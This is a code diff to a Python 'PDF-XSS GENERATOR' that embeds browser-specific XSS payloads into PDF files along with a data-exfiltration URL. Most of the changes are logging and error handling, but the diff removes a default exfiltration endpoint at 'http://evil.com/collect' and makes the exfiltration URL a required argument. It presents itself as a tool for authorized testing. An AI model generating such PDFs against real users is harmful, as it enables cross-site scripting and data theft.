@@ -28,6 +28,7 @@ import sys
 import platform
 import hashlib
 import re
+import logging
 from datetime import datetime
 from collections import defaultdict
 
@@ -37,6 +38,24 @@ if sys.version_info[0] < 3:
 # Version and metadata
 VERSION = "4.1"
 AUTHOR = "SNGWN"
+
+# Configure logging
+def setup_logging(log_level=logging.INFO, log_file=None):
+    """Setup logging configuration with optional file output"""
+    handlers = [logging.StreamHandler(sys.stdout)]
+    
+    if log_file:
+        handlers.append(logging.FileHandler(log_file, encoding='utf-8'))
+    
+    logging.basicConfig(
+        level=log_level,
+        format='%(asctime)s - %(levelname)s - %(message)s',
+        handlers=handlers
+    )
+    
+    return logging.getLogger(__name__)
+
+logger = setup_logging()
 
 def get_os_specific_paths():
     """Get OS-specific file paths for file system exploits"""
@@ -112,19 +131,27 @@ def validate_payload(payload_data):
     return True, "Valid"
 
 def load_browser_payloads(browser):
-    """Load payloads for a specific browser"""
+    """Load payloads for a specific browser with robust error handling"""
     browser_file = f"{browser}.json"
     
     if not os.path.exists(browser_file):
-        print(f"❌ Browser file not found: {browser_file}")
+        logger.error(f"Browser file not found: {browser_file}")
         return []
     
     try:
         with open(browser_file, 'r', encoding='utf-8') as f:
             data = json.load(f)
-            return data.get('payloads', [])
+            payloads = data.get('payloads', [])
+            logger.info(f"Loaded {len(payloads)} payloads for {browser} from {browser_file}")
+            return payloads
+    except json.JSONDecodeError as e:
+        logger.error(f"Invalid JSON in {browser_file}: {e}")
+        return []
+    except IOError as e:
+        logger.error(f"Cannot read {browser_file}: {e}")
+        return []
     except Exception as e:
-        print(f"❌ Error loading {browser_file}: {e}")
+        logger.error(f"Unexpected error loading {browser_file}: {e}")
         return []
 
 def substitute_url_in_payload(payload, target_url):
@@ -375,8 +402,9 @@ FEATURES:
     parser.add_argument('-b', '--browser', 
                         choices=['chrome', 'firefox', 'safari', 'adobe', 'edge', 'all'],
                         help='Target browser (required unless using --list-browsers)')
-    parser.add_argument('-u', '--url', default='http://evil.com/collect',
-                        help='Target URL for data exfiltration (default: http://evil.com/collect)')
+    parser.add_argument('-u', '--url', required=True,
+                        help='Target URL for data exfiltration (REQUIRED)')
+
     parser.add_argument('-o', '--output-dir', default='Files',
                         help='Output directory for PDF files (default: Files)')
     # --single-file argument removed as it's now the default behavior
@@ -386,8 +414,16 @@ FEATURES:
                         default='1.7', help='PDF version (default: 1.7)')
     parser.add_argument('--list-browsers', action='store_true',
                         help='List available browsers and payload counts')
+    parser.add_argument('--log-level', choices=['DEBUG', 'INFO', 'WARNING', 'ERROR'],
+                        default='INFO', help='Logging level (default: INFO)')
+    parser.add_argument('--log-file', help='Log file path (optional, logs to console by default)')
     
     args = parser.parse_args()
+    
+    # Setup logging with user-specified level
+    global logger
+    log_level = getattr(logging, args.log_level)
+    logger = setup_logging(log_level=log_level, log_file=args.log_file)
     
     if args.list_browsers:
         list_available_browsers()
@@ -396,15 +432,13 @@ FEATURES:
     if not args.browser:
         parser.error("Browser selection required. Use -b/--browser or --list-browsers")
     
-    print(f"🚀 PDF-XSS GENERATOR v{VERSION}")
-    print("=" * 40)
-    print(f"Target Browser: {args.browser}")
-    print(f"Target URL: {args.url}")
-    print(f"Output Directory: {args.output_dir}")
-    print(f"PDF Version: {args.pdf_version}")
+    logger.info(f"PDF-XSS GENERATOR v{VERSION}")
+    logger.info(f"Target Browser: {args.browser}")
+    logger.info(f"Target URL: {args.url}")
+    logger.info(f"Output Directory: {args.output_dir}")
+    logger.info(f"PDF Version: {args.pdf_version}")
     if args.count:
-        print(f"Payload Limit: {args.count}")
-    print()
+        logger.info(f"Payload Limit: {args.count}")
     
     # Load payloads
     if args.browser == 'all':
@@ -413,26 +447,26 @@ FEATURES:
         for browser in browsers:
             browser_payloads = load_browser_payloads(browser)
             if browser_payloads:
-                print(f"📖 Loading {browser} payloads from {browser}.json...")
-                print(f"✅ Loaded {len(browser_payloads)} payloads for {browser}")
                 all_payloads.extend(browser_payloads)
         payloads = all_payloads
+        logger.info(f"Total payloads loaded from all browsers: {len(payloads)}")
     else:
-        print(f"📖 Loading {args.browser} payloads from {args.browser}.json...")
+        logger.info(f"Loading {args.browser} payloads...")
         payloads = load_browser_payloads(args.browser)
         if payloads:
-            print(f"✅ Loaded {len(payloads)} payloads for {args.browser}")
+            logger.info(f"Loaded {len(payloads)} payloads for {args.browser}")
     
     if not payloads:
-        print("❌ No payloads loaded. Exiting.")
+        logger.error("No payloads loaded. Exiting.")
         return
     
     # Limit payloads if requested
     if args.count:
         payloads = payloads[:args.count]
+        logger.info(f"Limited to {len(payloads)} payloads")
     
     # Generate PDF files - Always single file with one payload per page
-    print(f"\n🔥 Creating single PDF file with {len(payloads)} payloads (one per page)...")
+    logger.info(f"Creating single PDF file with {len(payloads)} payloads (one per page)...")
     
     pdf_files = create_pdf_content(payloads, args.url, args.pdf_version, single_file=True)
     
@@ -440,15 +474,11 @@ FEATURES:
         saved_files = save_pdf_files(pdf_files, args.output_dir)
         
         for filename in saved_files:
-            print(f"  ✅ {filename}")
+            logger.info(f"PDF file created: {filename}")
         
-        print(f"\n🎯 GENERATION COMPLETE")
-        print("=" * 30)
-        print(f"✅ Total PDF files created: {len(saved_files)}")
-        print(f"📁 Files saved in: {args.output_dir}/")
-        print(f"\n⚠️  SECURITY NOTICE:")
-        print("These PDF files contain XSS payloads for authorized security testing only.")
-        print("Use only with proper permissions in controlled environments.")
+        logger.info(f"Generation complete - {len(saved_files)} PDF files created in {args.output_dir}/")
+        logger.warning("These PDF files contain XSS payloads for authorized security testing only.")
+        logger.warning("Use only with proper permissions in controlled environments.")
     else:
         print("❌ No PDF files were created.")
 
